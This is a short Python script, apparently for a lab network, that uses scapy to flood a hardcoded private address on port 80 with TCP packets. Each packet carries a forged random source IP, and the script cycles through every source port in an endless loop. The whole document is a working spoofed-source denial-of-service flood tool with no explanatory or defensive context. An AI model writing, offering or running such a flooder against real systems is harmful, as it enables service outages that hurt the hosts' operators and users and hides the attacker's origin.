import random
from scapy.all import *
target_IP = "172.16.79.5"
i = 1

while True:
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = "."
   source_ip = a + dot + b + dot + c + dot + d
   payload = "yada yada yada"

   for source_port in range(1, 65535):
        IP1 = IP(src = source_ip, dst = target_IP)
        TCP1 = TCP(sport = source_port, dport = 80)
        pkt = IP1 / TCP1 / payload
        send(pkt,inter = .001)

        print ("packet sent ", i)
        i = i + 1